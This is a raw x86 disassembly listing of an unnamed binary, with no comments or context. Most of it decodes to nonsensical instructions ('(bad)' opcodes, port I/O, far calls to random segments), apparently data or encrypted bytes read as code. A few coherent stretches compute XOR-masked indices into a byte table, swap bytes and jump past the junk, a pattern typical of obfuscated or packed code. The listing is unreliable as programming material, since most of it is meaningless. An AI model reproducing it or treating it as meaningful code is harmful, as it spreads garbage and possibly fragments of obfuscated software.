  40498b:	jns    0x404a0a
  40498d:	call   DWORD PTR [edi+0x7f33fbff]
  404993:	in     al,0xfe
  404995:	fistp  WORD PTR [ecx-0x33]
  404998:	inc    ebx
  404999:	jle    0x404948
  40499b:	hlt    
  40499c:	cmp    DWORD PTR [ecx+0x40],0x16c5e41
  4049a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049a4:	(bad)  
  4049a6:	push   esp
  4049a7:	daa    
  4049a8:	outs   dx,BYTE PTR ds:[esi]
  4049a9:	out    dx,al
  4049aa:	push   0x7d60fb79
  4049af:	(bad)  
  4049b0:	cdq    
  4049b1:	sub    BYTE PTR [eax],dh
  4049b3:	xchg   BYTE PTR [edx],ah
  4049b5:	mov    ds:0x227e7918,al
  4049ba:	jl     0x404981
  4049bc:	imul   ecx,DWORD PTR [eax],0xd1893b46
  4049c2:	or     ch,bh
  4049c4:	int    0xfd
  4049c6:	mov    dh,0xfc
  4049c8:	jmp    DWORD PTR [esi]
  4049ca:	std    
  4049cb:	push   ebp
  4049cc:	mov    eax,ds:0xd7151250
  4049d1:	mov    ch,0xc0
  4049d3:	out    dx,al
  4049d4:	jle    0x404a15
  4049d6:	pop    ecx
  4049d7:	or     BYTE PTR ss:[ecx-0x21e761dc],ah
  4049de:	push   eax
  4049df:	out    dx,al
  4049e0:	ror    ecx,1
  4049e2:	inc    esi
  4049e3:	les    eax,FWORD PTR [ecx+ebx*8-0x71]
  4049e7:	repz icebp 
  4049e9:	xchg   esi,eax
  4049ea:	imul   dh
  4049ec:	pop    esi
  4049ed:	pop    eax
  4049ee:	add    DWORD PTR [ecx-0x9],ebp
  4049f1:	(bad)  
  4049f2:	adc    edx,DWORD PTR [esp+ecx*1+0x5a]
  4049f6:	inc    ebx
  4049f7:	dec    ebp
  4049f8:	jp     0x404990
  4049fa:	add    BYTE PTR [edx],0xb1
  4049fd:	call   0x6a541655
  404a02:	mov    dh,0x71
  404a04:	sbb    edi,DWORD PTR [esi]
  404a06:	fst    DWORD PTR [edi+0x5f]
  404a09:	cld    
  404a0a:	fst    DWORD PTR [edx+0x60]
  404a0d:	fwait
  404a0e:	outs   dx,BYTE PTR ds:[esi]
  404a0f:	loope  0x4049be
  404a11:	ins    DWORD PTR es:[edi],dx
  404a12:	cs cdq 
  404a14:	or     eax,0x85139259
  404a19:	xor    al,0x72
  404a1b:	into   
  404a1c:	sub    DWORD PTR [eax-0x3],edi
  404a1f:	test   BYTE PTR [ecx],dl
  404a21:	(bad)  
  404a23:	mov    al,0x11
  404a25:	bnd ja 0x4049d6
  404a28:	jmp    0xd744d920
  404a2d:	ror    bh,0x19
  404a30:	cmp    dh,cl
  404a32:	(bad)
  404a36:	enter  0xdf53,0x7e
  404a3a:	xchg   BYTE PTR ds:0xea9b44a6,bh
  404a40:	test   eax,0x7513b93b
  404a45:	mov    cl,0xbc
  404a47:	sar    DWORD PTR [ebp-0x8],1
  404a4a:	mov    al,0xab
  404a4c:	xor    DWORD PTR [ebx+ebx*1],edx
  404a4f:	sbb    al,0x26
  404a51:	inc    ebx
  404a52:	call   0x6311:0xc19d7c3f
  404a59:	inc    ecx
  404a5a:	pop    ds
  404a5b:	push   ebx
  404a5c:	inc    ecx
  404a5d:	push   esp
  404a5e:	push   cs
  404a5f:	and    BYTE PTR [ecx+0x71],ah
  404a62:	adc    eax,DWORD PTR [ebx-0x7c]
  404a65:	mov    ebx,0x6f577c46
  404a6a:	or     al,0xd8
  404a6c:	imul   eax,DWORD PTR [eax+eiz*1],0xffffffc5
  404a70:	mov    edx,0x389d02bd
  404a75:	jge    0x404a74
  404a77:	mov    BYTE PTR [edi-0x6b5f4758],ah
  404a7d:	push   es
  404a7e:	add    DWORD PTR [esi+0x54],edi
  404a81:	dec    eax
  404a82:	mov    edi,DWORD PTR [edi+0x1d]
  404a85:	add    BYTE PTR [eax],cl
  404a87:	cmc    
  404a88:	int3   
  404a89:	pop    ss
  404a8a:	repnz sbb DWORD PTR [eax],ecx
  404a8d:	pop    eax
  404a8e:	add    al,0xfd
  404a90:	test   DWORD PTR [esi],esi
  404a92:	jo     0x404af0
  404a94:	daa    
  404a95:	xor    eax,0xc77dfda2
  404a9a:	test   DWORD PTR [ebx+0x8],esi
  404a9d:	es cmp edi,ebx
  404aa0:	jp     0x404a58
  404aa2:	mov    ebp,0xc712316a
  404aa7:	inc    ebp
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x1b3c6a28
  404b32:	jmp    0x404b52
  404b34:	xchg   edx,eax
  404b35:	mov    ds:0x587e7e22,al
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404ae6
  404b3e:	push   esi
  404b3f:	mov    esp,0x4ef1a824
  404b44:	retf   0x7622
  404b47:	rcr    DWORD PTR [ebx-0xc9aa151],1
  404b4d:	push   ds
  404b4e:	inc    edx
  404b4f:	mov    ds:0x42c6ec70,eax
  404b54:	sub    DWORD PTR [edx+esi*4],ebx
  404b57:	mov    eax,0x43b0c124
  404b5c:	ficomp DWORD PTR [ebx-0x6b3679d5]
  404b62:	jae    0x404af4
  404b64:	push   ebp
  404b65:	fist   DWORD PTR [ebp+ebx*8+0x16]
  404b69:	push   esi
  404b6a:	test   al,0xe5
  404b6c:	fwait
  404b6d:	loop   0x404b16
  404b6f:	repz addr16 pop ds
  404b72:	mov    ah,0x89
  404b74:	add    BYTE PTR [ebx],bh
  404b76:	xlat   BYTE PTR ds:[ebx]
  404b77:	cmp    ah,BYTE PTR [esi+0x6]
  404b7a:	test   ebx,ecx
  404b7c:	in     al,dx
  404b7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b7e:	ret    
  404b7f:	add    BYTE PTR [ebx-0x38aa5e77],0x27
  404b86:	fwait
  404b87:	add    eax,0xb8a75a96
  404b8c:	xor    al,0x4c
  404b8e:	sar    ch,0xbf
  404b91:	or     al,0x53
  404b93:	xor    cl,BYTE PTR [ebx-0x56]
  404b96:	dec    esp
  404b97:	pop    ebp
  404b98:	or     ecx,esi
  404b9a:	cwde   
  404b9b:	cmp    eax,0xba106533
  404ba0:	iret   
  404ba1:	inc    esi
  404ba2:	sub    al,BYTE PTR [ebx]
  404ba4:	jns    0x404c23
  404ba6:	mov    bl,0x2f
  404ba8:	stc    
  404ba9:	push   ebp
  404baa:	xchg   esp,eax
  404bab:	pop    eax
  404bac:	rcr    di,1
  404baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bb0:	sti    
  404bb1:	sub    edx,ebp
  404bb3:	pop    ebx
  404bb4:	out    0xd7,al
  404bb6:	(bad)  
  404bb7:	mov    ecx,0x8775f22c
  404bbc:	and    BYTE PTR [edi-0x3b],ch
  404bbf:	stc    
  404bc0:	mov    esp,0xf9908b1d
  404bc5:	scas   ax,WORD PTR es:[edi]
  404bc7:	cld    
  404bc8:	inc    eax
  404bc9:	test   esi,esp
  404bcb:	ja     0x404bd6
  404bcd:	mov    ds:0xeef7b829,al
  404bd2:	jmp    0x404b9b
  404bd4:	pop    ds
  404bd5:	retf   0xa5f2
  404bd8:	push   ebx
  404bd9:	inc    esp
  404bda:	cmp    cl,BYTE PTR [ebp+0x71]
  404bdd:	int    0x9d
  404bdf:	xchg   edx,eax
  404be0:	push   esp
  404be1:	mov    ds:0x1fd00874,al
  404be6:	(bad)  
  404be7:	dec    ecx
  404be9:	dec    esp
  404bea:	inc    edx
  404beb:	das    
  404bec:	push   0x99c34d97
  404bf1:	dec    esi
  404bf2:	(bad)  
  404bf3:	mov    ch,0x8e
  404bf5:	mov    ecx,0x41ec969f
  404bfa:	mov    al,ds:0x9f4122b8
  404bff:	aad    0x1a
  404c01:	or     BYTE PTR [edx+0x7a58bf2d],bh
  404c07:	int3   
  404c08:	aad    0x7e
  404c0a:	mov    cl,0xcf
  404c0c:	mov    ecx,DWORD PTR [eax]
  404c0e:	jg     0x404c67
  404c10:	xchg   DWORD PTR [edi+esi*4+0x7a],edx
  404c14:	pushf  
  404c15:	and    esi,DWORD PTR [edi+0x7bfaf03c]
  404c1b:	jmp    0x7e2f:0x750b570d
  404c22:	sahf   
  404c23:	fimul  WORD PTR [eax+0x11]
  404c26:	push   edi
  404c27:	inc    ecx
  404c28:	icebp  
  404c29:	data16 mov bh,0x1a
  404c2c:	sub    eax,0xd65dd91d
  404c31:	popa   
  404c32:	mov    ebx,0x6de83dd3
  404c37:	dec    esi
  404c38:	and    esp,ebp
  404c3a:	cli    
  404c3b:	push   esi
  404c3c:	cld    
  404c3d:	loope  0x404c08
  404c3f:	sahf   
  404c40:	int3   
  404c41:	loope  0x404ca7
  404c43:	inc    esi
  404c44:	jns    0x404c47
  404c46:	mov    ebp,0xca470da2
  404c4b:	xchg   BYTE PTR [eax+0x24df480b],ch
  404c51:	es (bad) 
  404c53:	retf   
  404c54:	pop    edi
  404c55:	es cmp eax,0xdfabf517
  404c5b:	outs   dx,BYTE PTR ds:[esi]
  404c5c:	jp     0x404c2e
  404c5e:	test   DWORD PTR [edx+eax*2+0x26457636],ebp
  404c65:	call   0xebb5f2c7
  404c6a:	aaa    
  404c6b:	adc    DWORD PTR [esp+esi*1+0x5b],esi
  404c6f:	push   ebp
  404c70:	popa   
  404c71:	cmovae edx,DWORD PTR [edi+0x15aace19]
  404c78:	sbb    BYTE PTR [esp+ebx*1+0x6b],ch
  404c7c:	(bad)  
  404c7d:	pmaddwd mm1,QWORD PTR [edi]
  404c80:	pop    es
  404c81:	into   
  404c82:	or     ah,BYTE PTR [edi+0x4febf22e]
  404c88:	nop
  404c89:	cmp    eax,DWORD PTR [edi+0x4c]
  404c8c:	cwde   
  404c8d:	xchg   edx,eax
  404c8e:	mov    dh,0xf9
  404c90:	addr16 test eax,0xbec93157
  404c96:	test   al,0xe2
  404c98:	push   cs
  404c99:	push   esp
  404c9a:	jge    0x404ca5
  404c9c:	ja     0x404c7c
  404c9e:	dec    ebx
  404c9f:	push   0x5d
  404ca1:	sub    ebx,DWORD PTR [edx]
  404ca3:	(bad)  
  404ca4:	mov    ah,0x71
  404ca6:	mov    ds:0x98b4d2a,eax
  404cab:	outs   dx,DWORD PTR ds:[esi]
  404cac:	cmp    esi,DWORD PTR [esi+0x20]
  404caf:	in     al,dx
  404cb0:	sbb    eax,0xdfe2b524
  404cb5:	cmp    DWORD PTR [eax+eiz*2],edx
  404cb8:	pop    edi
  404cb9:	dec    edx
  404cba:	and    ecx,eax
  404cbc:	loope  0x404d13
  404cbe:	pusha  
  404cbf:	addr16 pusha 
  404cc1:	jle    0x404cce
  404cc3:	mov    al,ds:0x44420764
  404cc8:	sbb    eax,0xd93058cc
  404ccd:	push   edi
  404cce:	xchg   ebp,eax
  404ccf:	ins    DWORD PTR es:[edi],dx
  404cd0:	cmc    
  404cd1:	shr    BYTE PTR [esi+0x70],1
  404cd4:	ja     0xcdd30a3b
  404cda:	adc    BYTE PTR ds:0x90c91fd2,0x4e
  404ce1:	mov    cl,0xc7
  404ce3:	mov    ah,0xed
  404ce5:	lods   al,BYTE PTR ds:[esi]
  404ce6:	lods   al,BYTE PTR ds:[esi]
  404ce7:	mov    ebp,0xcbc89829
  404cec:	mov    bh,bh
  404cee:	and    al,0x3a
  404cf0:	test   BYTE PTR [edx],al
  404cf2:	mov    ds:0xf621295c,al
  404cf7:	sbb    BYTE PTR [ebx+0x43ac30e4],ch
  404cfd:	fild   DWORD PTR [eax+ebp*1-0x1ee868a5]
  404d04:	dec    ecx
  404d05:	sar    BYTE PTR [ebp+edx*1-0x6a],0x9d
  404d0a:	dec    eax
  404d0b:	gs push edi
  404d0d:	mov    esp,0xef379285
  404d12:	push   ecx
  404d13:	add    cl,BYTE PTR [esi+0x41b179d]
  404d19:	pop    esp
  404d1a:	mov    dh,0x48
  404d1c:	test   DWORD PTR [eax],edx
  404d1e:	cmp    al,BYTE PTR [edx+eax*8+0x68]
  404d22:	xchg   ebx,eax
  404d23:	mov    al,0xff
  404d25:	pop    ebp
  404d26:	ins    DWORD PTR es:[edi],dx
  404d27:	test   DWORD PTR ds:0x3c72a8e6,edi
  404d2d:	shr    DWORD PTR [edx-0x3],1
  404d30:	mov    edx,0x70ab175a
  404d35:	and    BYTE PTR [ecx-0x9],al
  404d38:	adc    edi,ebp
  404d3a:	mov    ah,bl
  404d3c:	popa   
  404d3d:	or     eax,0xcbdfcb74
  404d42:	icebp  
  404d43:	mov    ebx,eax
  404d45:	jp     0x404ce2
  404d47:	mov    bl,0xb5
  404d49:	test   al,0x24
  404d4b:	mov    ecx,0xba384ba1
  404d50:	in     al,dx
  404d51:	push   edi
  404d52:	(bad)  
  404d53:	sbb    BYTE PTR [eax-0x6c],dl
  404d56:	in     al,0xb6
  404d58:	rol    DWORD PTR [ebp+edx*1+0x16a00a05],0xfd
  404d60:	lea    ecx,[eax-0x26]
  404d63:	pushf  
  404d64:	fs call 0x6012:0xbb4c3b8d
  404d6c:	sbb    DWORD PTR [ebp-0x40],ebp
  404d6f:	lds    edx,FWORD PTR [ecx]
  404d71:	adc    ebp,DWORD PTR [ecx]
  404d73:	push   0xffffffd4
  404d75:	cmp    esp,ebx
  404d77:	dec    ebx
  404d78:	leave  
  404d79:	sahf   
  404d7a:	push   edx
  404d7b:	dec    ebp
  404d7c:	imul   ebp,DWORD PTR ss:[ebx+ebp*4-0x32],0xffffffb2
  404d82:	push   esi
  404d83:	(bad)  
  404d85:	loopne 0x404db4
  404d87:	out    dx,al
  404d88:	outs   dx,BYTE PTR ds:[esi]
  404d89:	and    ch,bl
  404d8b:	dec    edx
  404d8c:	lds    esi,FWORD PTR [esi]
  404d8e:	push   edx
  404d8f:	or     al,0xe0
  404d92:	into   
  404d93:	rcl    DWORD PTR [esi-0x6],0x3f
  404d97:	into   
  404d98:	shl    ebx,1
  404d9a:	(bad)  
  404d9b:	fnstenv [ebx+0xde5653b]
  404da1:	xlat   BYTE PTR ds:[ebx]
  404da2:	scas   eax,DWORD PTR es:[edi]
  404da3:	push   ss
  404da4:	push   ecx
  404da5:	sbb    eax,0x85e8e90f
  404daa:	or     eax,0x88d27734
  404daf:	ficom  DWORD PTR [edi+0x4d5c35a7]
  404db5:	or     ebp,DWORD PTR [edi+esi*1+0x5ea6e0c2]
  404dbc:	in     al,0xa3
  404dbe:	xor    bh,BYTE PTR [edx+0x38]
  404dc1:	add    esp,esi
  404dc3:	test   BYTE PTR [eax-0x54],0x8
  404dc7:	loop   0x404df5
  404dc9:	dec    eax
  404dca:	in     eax,dx
  404dcb:	call   0x6656f5f3
  404dd0:	sbb    BYTE PTR [ecx+0x5acf9e47],bh
  404dd6:	ret    0x63b6
  404dd9:	in     eax,0xd8
  404ddb:	adc    eax,edi
  404ddd:	push   ebx
  404dde:	xor    dh,BYTE PTR [edi+0x42]
  404de1:	adc    DWORD PTR [ecx],eax
  404de3:	daa    
  404de4:	fbstp  TBYTE PTR [ecx-0x17]
  404de7:	or     ecx,ebp
  404de9:	and    esi,ebp
  404deb:	pop    edx
  404dec:	ins    DWORD PTR es:[edi],dx
  404ded:	and    eax,0xf5c02d35
  404df2:	aas    
  404df3:	jle    0x404dc5
  404df5:	sbb    al,0xcb
  404df7:	mov    ebx,0x35b4153f
  404dfc:	dec    eax
  404dfd:	adc    eax,0x9c97012b
  404e02:	inc    esp
  404e03:	and    BYTE PTR [ecx-0x5347eca6],bl
  404e09:	add    al,0x9e
  404e0b:	pop    ecx
  404e0c:	dec    edx
  404e0d:	push   0x6b
  404e0f:	push   edx
  404e10:	mov    al,fs:0x136e3979
  404e16:	push   eax
  404e17:	dec    esp
  404e18:	adc    ah,ch
  404e1a:	or     bh,BYTE PTR [esi]
  404e1c:	lahf   
  404e1d:	in     eax,0x37
  404e1f:	push   ds
  404e20:	dec    esi
  404e21:	mov    al,ds:0xff9031e
  404e26:	scas   eax,DWORD PTR es:[edi]
  404e27:	xlat   BYTE PTR ds:[ebx]
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e8c
  404e5e:	inc    eax
  404e5f:	retf   0x8cbf
  404e62:	and    DWORD PTR [esi+0x7e],edi
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404ecf
  404e6a:	sar    esi,0x6d
  404e6d:	push   eax
  404e6e:	inc    ebx
  404e6f:	xor    BYTE PTR [edx],dh
  404e71:	call   0x7442f7f
  404e76:	mov    esp,0xf01e38c8
  404e7b:	sbb    BYTE PTR [esi+0x1135f47b],dh
  404e81:	popa   
  404e82:	cmp    DWORD PTR [ebx],eax
  404e84:	repnz shl DWORD PTR [edx+eiz*8],0xa7
  404e89:	lods   al,BYTE PTR ds:[esi]
  404e8a:	inc    eax
  404e8b:	mov    ss,WORD PTR [edi]
  404e8d:	loope  0x404f07
  404e8f:	xchg   edi,eax
  404e90:	int    0xb3
  404e92:	sbb    al,0x7b
  404e94:	fs dec ebx
  404e96:	pusha  
  404e97:	retf   0xa526
  404e9a:	xchg   BYTE PTR [esp+eiz*2],bl
  404e9d:	dec    ecx
  404e9e:	gs and al,0x9f
  404ea1:	icebp  
  404ea2:	mov    esp,0xbea0b213
  404ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ea8:	pushf  
  404ea9:	sub    al,0xe5
  404eab:	out    0xa4,eax
  404ead:	lds    esp,FWORD PTR [edi+eiz*2]
  404eb0:	dec    ebp
  404eb1:	stos   DWORD PTR es:[edi],eax
  404eb2:	ret    0xf1ab
  404eb5:	jecxz  0x404ea6
  404eb7:	jge    0x404eaa
  404eb9:	mov    dh,0x2d
  404ebb:	mov    al,ds:0x81cb811
  404ec0:	jl     0x404f26
  404ec2:	shr    DWORD PTR [ebp+0x67],1
  404ec5:	jmp    DWORD PTR [eax-0x3df00c30]
  404ecb:	jle    0x404e79
  404ecd:	sar    BYTE PTR [edx+ebx*8-0x7161119a],1
  404ed4:	inc    edx
  404ed5:	sahf   
  404ed6:	push   esp
  404ed7:	call   0x6f69:0x21002372
  404ede:	mov    bl,0xf9
  404ee0:	mov    esp,0x3f4195e0
  404ee5:	jne    0x404eab
  404ee7:	retf   
  404ee8:	icebp  
  404ee9:	xchg   ebx,eax
  404eea:	add    BYTE PTR [eiz*8+0x216b58c4],ch
  404ef1:	sti    
  404ef2:	call   0xf40e:0x5c7a90a2
  404ef9:	mov    ds:0x93935278,eax
  404efe:	sbb    WORD PTR [eax+ebp*8],ax
  404f02:	nop
  404f03:	push   eax
  404f04:	and    edi,DWORD PTR [eax-0x4060cfb6]
  404f0a:	pop    esi
  404f0b:	mov    al,ds:0xb9cdafd1
  404f10:	push   0xffffffd1
  404f12:	jnp    0x404ee1
  404f14:	push   edx
  404f15:	pop    es
  404f16:	repnz or eax,0x317e5c2c
  404f1c:	loopne 0x404f3a
  404f1e:	add    cl,BYTE PTR [ecx]
  404f20:	mov    cl,0xe4
  404f22:	mov    BYTE PTR [eax+0x79570d53],dh
  404f28:	lods   eax,DWORD PTR ds:[esi]
  404f29:	xor    al,0x21
  404f2b:	pop    esp
  404f2c:	dec    edx
  404f2d:	ss inc ebx
  404f2f:	dec    edi
  404f30:	repnz push esi
  404f32:	sub    eax,0xbd818396
  404f37:	ret    
  404f38:	jo     0x404f1f
  404f3a:	jp     0x404ecf
  404f3c:	hlt    
  404f3d:	aas    
  404f3e:	pushf  
  404f3f:	sbb    edx,DWORD PTR [eax]
  404f41:	cmp    eax,0x18a99007
  404f46:	out    dx,eax
  404f47:	xor    ah,al
  404f49:	imul   ecx,DWORD PTR [ebx+0x6f],0x33067777
  404f50:	sbb    BYTE PTR [ecx+edi*1-0x72b4b9fa],cl
  404f57:	lahf   
  404f58:	out    dx,eax
  404f59:	clc    
  404f5a:	adc    dl,0x3c
  404f5d:	in     eax,dx
  404f5e:	mov    es,WORD PTR [ecx+0x5d]
  404f61:	xor    edx,eax
  404f63:	mov    dh,0x89
  404f65:	and    DWORD PTR [eax+0x49],esp
  404f68:	mov    eax,0xff0c714a
  404f6d:	out    dx,al
  404f6e:	les    ebx,FWORD PTR [eax]
  404f70:	mov    ebp,eax
  404f72:	sub    DWORD PTR [esi+0x2c56ffce],esi
  404f78:	rcr    BYTE PTR [edx+0xe3e1ff0],0x5a
  404f7f:	pop    ebp
  404f80:	mov    edx,0x1337bbee
  404f85:	(bad)  
  404f86:	cwde   
  404f87:	xlat   BYTE PTR ds:[ebx]
  404f88:	ins    BYTE PTR es:[edi],dx
  404f89:	mov    edx,0x52f9aa0a
  404f8e:	or     al,0xc8
  404f90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f91:	cmp    bl,cl
  404f93:	push   ss
  404f94:	mov    WORD PTR [ebp-0xf],cs
  404f97:	out    dx,eax
  404f98:	mov    bl,0x82
  404f9a:	cwde   
  404f9b:	sbb    dh,bh
  404f9d:	je     0x405014
  404f9f:	iret   
  404fa0:	sbb    eax,0xa3021134
  404fa5:	adc    ecx,DWORD PTR [ecx+0x78144581]
  404fab:	(bad)  
  404fac:	push   cs
  404fad:	cmp    BYTE PTR [ecx],0x54
  404fb0:	jae    0x404fef
  404fb2:	pop    es
  404fb3:	jg     0x404f35
  404fb5:	mov    ebp,0x2adf8927
  404fba:	xchg   edi,eax
  404fbb:	pop    esi
  404fbc:	inc    ecx
  404fbd:	mov    esi,0xaa9c7675
  404fc2:	aaa    
  404fc3:	jne    0x40503e
  404fc5:	repnz in eax,dx
  404fc7:	mov    eax,ds:0xeb4c0464
  404fcc:	mov    ds:0xae9f85e4,al
  404fd1:	enter  0x7dde,0x37
  404fd5:	popf   
  404fd6:	mov    ds:0xe8f8f143,eax
  404fdb:	sub    eax,0xe4b451ae
  404fe0:	dec    edx
  404fe1:	inc    ecx
  404fe2:	or     DWORD PTR [ebp+0x2adca0f5],ebp
  404fe8:	mov    ds:0x76f6effc,al
  404fed:	adc    dh,bl
  404fef:	imul   ebp,DWORD PTR [edx+ebx*2+0x1333729b],0x17c1318e
  404ffa:	mov    cl,0xc0
  404ffc:	repz pop ebp
  404ffe:	dec    ebx
  404fff:	loope  0x404fa0
  405001:	xor    al,0xbe
  405003:	mov    WORD PTR [edi-0x32],gs
  405006:	xor    eax,0xfdfec3cb
  40500b:	adc    al,ah
  40500d:	push   esi
  40500e:	lods   al,BYTE PTR ds:[esi]
  40500f:	push   ebx
  405010:	popa   
  405011:	mov    edi,DWORD PTR [eax+0x10]
  405014:	cmp    edx,ecx
  405016:	fnsave [ebx]
  405018:	sbb    ebp,DWORD PTR [esi-0x40d836e2]
  40501e:	push   ds
  40501f:	cmp    DWORD PTR [esi],edx
  405021:	mov    ch,0x75
  405023:	mov    dl,0xc3
  405025:	mov    eax,ds:0x460b5688
  40502a:	add    al,0x82
  40502c:	outs   dx,DWORD PTR ds:[esi]
  40502d:	sbb    al,0x4e
  40502f:	sub    bl,BYTE PTR [edx+0x32c642b3]
  405035:	call   0x65b6:0xd5457120
  40503c:	scas   al,BYTE PTR es:[edi]
  40503d:	jg     0x404fe6
  40503f:	mov    dl,0x30
  405041:	add    DWORD PTR [esp+edi*2-0x28],esp
  405045:	sbb    BYTE PTR [ebx-0xe48b24a],ah
  40504b:	jb     0x4050a0
  40504d:	arpl   WORD PTR [edi],dx
  40504f:	sbb    eax,0xbd6fcd76
  405054:	js     0x404fe2
  405056:	pushf  
  405057:	data16 scas al,BYTE PTR es:[edi]
  405059:	add    esi,ebx
  40505b:	xlat   BYTE PTR ds:[ebx]
  40505c:	mov    ebx,0xa3488968
  405061:	inc    ebp
  405062:	cmp    DWORD PTR [ebx-0x7230e547],0x13
  405069:	cmp    BYTE PTR [esi+0x2f9ba2d0],dh
  40506f:	shr    esi,cl
  405071:	push   ecx
  405072:	adc    BYTE PTR [ebp-0x78],cl
  405075:	ins    DWORD PTR es:[edi],dx
  405076:	push   ss
  405077:	scas   eax,DWORD PTR es:[edi]
  405078:	and    ecx,DWORD PTR [edi+0x79]
  40507b:	mov    edi,0xa4fbe035
  405080:	stos   DWORD PTR es:[edi],eax
  405081:	jb     0x405030
  405083:	inc    ebx
  405084:	sbb    al,0x39
  405086:	ret    
  405087:	xor    ebp,DWORD PTR [eax]
  405089:	aad    0xf7
  40508b:	pop    ebx
  40508c:	pop    ebx
  40508d:	test   al,0x5b
  40508f:	xchg   edx,eax
  405090:	call   0x2f5ed3b3
  405095:	pop    es
  405096:	fsub   st(0),st
  405098:	call   0xcc8cc43c
  40509d:	mov    DWORD PTR [ebp-0x3a],eax
  4050a0:	ds cwde 
  4050a2:	and    dh,BYTE PTR [edi-0x3b]
  4050a5:	fnstcw WORD PTR [ebp-0x5a]
  4050a8:	xchg   edi,eax
  4050a9:	jns    0x405072
  4050ab:	mov    bh,0xf1
  4050ad:	dec    esi
  4050ae:	repnz pop ecx
  4050b0:	outs   dx,BYTE PTR ds:[esi]
  4050b1:	(bad)  
  4050b2:	cli    
  4050b3:	scas   al,BYTE PTR es:[edi]
  4050b4:	push   ebx
  4050b5:	into   
  4050b6:	inc    edi
  4050b7:	ret    0xa728
  4050ba:	sub    BYTE PTR [esi+0x57],bl
  4050bd:	fldenv ds:0xe44b168a
  4050c3:	rcl    DWORD PTR [edi+0xa],1
  4050c6:	pop    ecx
  4050c7:	retf   
  4050c8:	sbb    eax,0xd0d50c1d
  4050cd:	loope  0x405052
  4050cf:	daa    
  4050d0:	fistp  DWORD PTR [eax-0x5e7c8811]
  4050d6:	test   BYTE PTR [esp+edx*2+0x3f3d1d7b],0x88
  4050de:	dec    esi
  4050df:	mov    eax,0xc4a78cc
  4050e4:	cmp    DWORD PTR [esi],esp
  4050e6:	jmp    0x18db:0xdf109cc9
  4050ed:	mov    BYTE PTR [esp+ebx*8-0x4635b313],0xa2
  4050f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050f6:	dec    eax
  4050f7:	mov    BYTE PTR [edi+0x624a1418],bl
  4050fd:	adc    eax,0xb3e41e9e
  405102:	xor    ah,ch
  405104:	sbb    edi,edx
  405106:	xor    eax,0x5763ca11
  40510b:	fadd   QWORD PTR [edi+0x0]
  40510e:	retf   
  40510f:	jp     0x40516f
  405111:	dec    esp
  405112:	in     al,0x6e
  405114:	or     cl,BYTE PTR [eax]
  405116:	loope  0x405125
  405118:	mov    edx,DWORD PTR [ebx+0x6cbdb32f]
  40511e:	and    edx,DWORD PTR [edi]
  405120:	lahf   
  405121:	rcl    BYTE PTR [ecx+0x75],1
  405124:	in     al,dx
  405125:	lea    edx,[edi+0x55522cef]
  40512b:	je     0x405176
  40512d:	test   DWORD PTR ds:0x9fd4226c,edx
  405133:	adc    esi,edx
  405135:	pop    ecx
  405136:	and    bl,BYTE PTR [ecx+0x63dca4fe]
  40513c:	popf   
  40513d:	in     eax,0x52
  40513f:	dec    edi
  405140:	dec    esp
  405141:	test   DWORD PTR [esi-0x695729ff],0x71da5546
  40514b:	dec    ebx
  40514c:	dec    eax
  40514d:	(bad)  
  40514e:	xchg   ecx,eax
  40514f:	imul   edi,ebx
